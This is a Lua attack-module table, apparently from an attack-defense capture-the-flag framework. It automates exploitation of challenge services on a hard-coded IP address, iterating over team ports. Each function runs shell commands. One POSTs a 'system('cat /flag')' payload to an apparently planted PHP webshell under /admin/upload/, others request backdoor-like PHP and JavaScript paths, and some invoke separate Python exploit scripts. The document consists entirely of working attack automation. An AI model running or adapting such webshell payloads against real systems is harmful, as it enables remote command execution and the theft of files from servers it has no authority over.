-----------------------------
-- Attack Modules
-----------------------------
attack = {
    [1] = { -- challenge 1
        function(i) -- method 1
            return execute("python3 web1.py " .. i) -- call python script
        end,
    },
    [2] = { -- challenge 2
        function(i) -- method 1
            return execute(string.format("curl -d 'hacker=system(\'cat /flag\');' -s http://39.100.119.37:2%02d80/admin/upload/1532851294.php?rand=" .. math.random(), i))
        end,
        function(i) -- method 2
            return execute(string.format("curl -s http://39.100.119.37:2%02d80/admin/index.php?rand=" .. math.random(), i))
        end,
    },
    [3] = { -- challenge 3
        function(i) -- method 1
            return execute("python3 web3.py " .. i)
        end,
        function(i) -- method 2
            return execute(string.format("curl -s http://39.100.119.37:3%02d80/admin/jquery.min.js?rand=" .. math.random(), i))
        end,
        function(i) -- method 3
            return execute(string.format("curl -s http://39.100.119.37:3%02d80/admin/2.php?rand=" .. math.random(), i))
        end
    }
}